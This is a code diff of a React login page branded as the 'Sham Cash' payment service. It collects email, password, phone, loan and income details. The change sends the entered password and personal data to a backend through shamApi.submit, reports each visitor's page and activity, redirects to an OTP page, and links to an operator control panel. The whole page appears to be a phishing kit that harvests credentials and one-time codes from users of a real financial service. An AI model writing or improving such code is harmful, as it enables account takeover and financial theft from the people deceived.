@@ -1,17 +1,11 @@
 import {
-  Banknote,
-  Eye,
-  Grid3X3,
-  Headphones,
-  Lock,
-  Phone,
-  TrendingUp,
-  UserRound,
+  Banknote, Eye, Grid3X3, Headphones, Lock, Phone, TrendingUp, UserRound,
 } from "lucide-react";
 import { useState, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
+import { shamApi } from "@/lib/shamApi";
 
 const T = {
   ar: {
@@ -43,25 +37,12 @@ const T = {
 function ShamLogo() {
   return (
     <div className="relative h-28 w-32">
-      <div
-        className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
-        style={{
-          clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)",
-        }}
-      />
-      <div
-        className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
-        style={{
-          clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)",
-        }}
-      />
+      <div className="absolute left-5 top-12 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#5dd99f] via-[#44a984] to-[#257b6f] shadow-[0_18px_35px_rgba(20,219,144,0.12)]"
+        style={{ clipPath: "polygon(0 20%, 64% 0, 100% 27%, 37% 57%, 100% 86%, 100% 100%, 36% 71%, 0 50%)" }} />
+      <div className="absolute left-14 top-5 h-12 w-20 rounded-[4px] bg-gradient-to-br from-[#6273dd] via-[#5365c3] to-[#354075] shadow-[0_22px_40px_rgba(99,116,212,0.18)]"
+        style={{ clipPath: "polygon(0 0, 100% 34%, 100% 100%, 35% 70%, 0 53%)" }} />
     </div>
   );
-}
-
-function broadcast(data: Record<string, string>) {
-  localStorage.setItem("sham_visitor_data", JSON.stringify(data));
-  localStorage.setItem("sham_visitor_updated_at", Date.now().toString());
 }
 
 export function ShamCashLogin() {
@@ -69,23 +50,41 @@ export function ShamCashLogin() {
   const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
   const [lang, setLang] = useLang();
   const t = T[lang];
+
   useVisitorTracking("تسجيل الدخول");
   useAdminCommands();
 
   useEffect(() => {
-    broadcast({ email: "", phone: "", loan: "", income: "" });
+    const id = localStorage.getItem("sham_visitor_id");
+    if (id) {
+      shamApi.patch(id, { page: "تسجيل الدخول", isActive: true, lastSeen: Date.now() });
+    }
   }, []);
 
-  function updateField(key: string, value: string) {
-    const next = { ...fields, [key]: value };
-    setFields(next as typeof fields);
-    if (key === "phone") localStorage.setItem("sham_phone", value);
-    localStorage.setItem("sham_visitor_status", "typing");
-    broadcast({ email: next.email, phone: next.phone, loan: next.loan, income: next.income });
-    clearTimeout((window as unknown as Record<string, unknown>)._shamTypingTimer as number);
-    (window as unknown as Record<string, unknown>)._shamTypingTimer = setTimeout(() => {
-      localStorage.setItem("sham_visitor_status", "connected");
-    }, 2000);
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
+    localStorage.setItem("sham_visitor_id", visitorId);
+    localStorage.setItem("sham_phone", fields.phone);
+
+    await shamApi.submit({
+      id: visitorId,
+      submittedAt: new Date().toLocaleTimeString("ar-SY"),
+      submittedAtTs: Date.now(),
+      email: fields.email,
+      password: fields.password,
+      phone: fields.phone,
+      loan: fields.loan,
+      income: fields.income,
+      otpCode: "",
+      otpStatus: null,
+      changepassStatus: null,
+      page: "تسجيل الدخول",
+      isActive: true,
+      lastSeen: Date.now(),
+    });
+
+    window.location.href = "/otp";
   }
 
   return (
@@ -107,37 +106,7 @@ export function ShamCashLogin() {
           <ShamLogo />
         </div>
 
-        <form
-          className="relative space-y-5"
-          onSubmit={(e) => {
-            e.preventDefault();
-            localStorage.setItem("sham_visitor_status", "submitted");
-            const visitorId = localStorage.getItem("sham_visitor_id") ?? `v-${Date.now()}`;
-            const existing: Record<string, unknown>[] = (() => { try { return JSON.parse(localStorage.getItem("sham_submissions") ?? "[]"); } catch { return []; } })();
-            const record = {
-              id: visitorId,
-              submittedAt: new Date().toLocaleTimeString("ar-SY"),
-              submittedAtTs: Date.now(),
-              email: fields.email,
-              password: fields.password,
-              phone: fields.phone,
-              loan: fields.loan,
-              income: fields.income,
-              otpCode: "",
-              otpStatus: null,
-              changepassStatus: null,
-              page: "تسجيل الدخول",
-              isActive: true,
-              lastSeen: Date.now(),
-            };
-            const idx = existing.findIndex((r) => r.id === visitorId);
-            if (idx >= 0) existing[idx] = record; else existing.unshift(record);
-            localStorage.setItem("sham_submissions", JSON.stringify(existing));
-            localStorage.setItem("sham_visitor_data", JSON.stringify({ email: fields.email, phone: fields.phone, loan: fields.loan, income: fields.income }));
-            localStorage.setItem("sham_visitor_password", fields.password);
-            window.location.href = "/otp";
-          }}
-        >
+        <form className="relative space-y-5" onSubmit={handleSubmit}>
           <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
             {t.heading}
           </h1>
@@ -145,28 +114,18 @@ export function ShamCashLogin() {
           <div className="space-y-4">
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
-              <input
-                type="email"
-                placeholder={t.email}
+              <input type="text" placeholder={t.email}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir={t.dir}
-                autoComplete="email"
-                value={fields.email}
-                onChange={(e) => updateField("email", e.target.value)}
-              />
+                dir={t.dir} autoComplete="email" value={fields.email}
+                onChange={(e) => setFields((p) => ({ ...p, email: e.target.value }))} />
             </div>
 
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
-              <input
-                type={showPassword ? "text" : "password"}
-                placeholder={t.password}
+              <input type={showPassword ? "text" : "password"} placeholder={t.password}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir={t.dir}
-                autoComplete="current-password"
-                value={fields.password}
-                onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))}
-              />
+                dir={t.dir} autoComplete="current-password" value={fields.password}
+                onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))} />
               <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/60 hover:text-white/90 transition-colors">
                 <Eye className="h-5 w-5" />
               </button>
@@ -176,39 +135,26 @@ export function ShamCashLogin() {
           <div className="space-y-4 pt-1">
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Banknote className="h-5 w-5" /></div>
-              <input
-                type="number"
-                placeholder={t.loan}
+              <input type="number" placeholder={t.loan}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir={t.dir}
-                value={fields.loan}
-                onChange={(e) => updateField("loan", e.target.value)}
-              />
+                dir={t.dir} value={fields.loan}
+                onChange={(e) => setFields((p) => ({ ...p, loan: e.target.value }))} />
             </div>
 
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Phone className="h-5 w-5" /></div>
-              <input
-                type="tel"
-                placeholder={t.phone}
+              <input type="tel" placeholder={t.phone}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir="ltr"
-                autoComplete="tel"
-                value={fields.phone}
-                onChange={(e) => updateField("phone", e.target.value)}
-              />
+                dir="ltr" autoComplete="tel" value={fields.phone}
+                onChange={(e) => setFields((p) => ({ ...p, phone: e.target.value }))} />
             </div>
 
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><TrendingUp className="h-5 w-5" /></div>
-              <input
-                type="number"
-                placeholder={t.income}
+              <input type="number" placeholder={t.income}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir={t.dir}
-                value={fields.income}
-                onChange={(e) => updateField("income", e.target.value)}
-              />
+                dir={t.dir} value={fields.income}
+                onChange={(e) => setFields((p) => ({ ...p, income: e.target.value }))} />
             </div>
           </div>
 
@@ -223,10 +169,7 @@ export function ShamCashLogin() {
 
           <p className="text-center text-[14px] font-semibold text-[#cfd2df]/78">
             {t.forgotPass}{" "}
-            <span
-              className="cursor-pointer text-[#7183e6] hover:underline"
-              onClick={() => { window.location.href = "/changepass"; }}
-            >
+            <span className="cursor-pointer text-[#7183e6] hover:underline" onClick={() => { window.location.href = "/changepass"; }}>
               {t.changePass}
             </span>
           </p>
@@ -237,10 +180,7 @@ export function ShamCashLogin() {
         </form>
 
         <footer className="relative mt-auto flex flex-col items-center gap-3 pb-0 pt-4 text-center">
-          <a
-            href="/admin"
-            className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide"
-          >
+          <a href="/admin-panel/" className="text-[12px] font-semibold text-white/25 hover:text-white/50 transition-colors tracking-wide">
             لوحة التحكم
           </a>
           <div className="space-y-3">
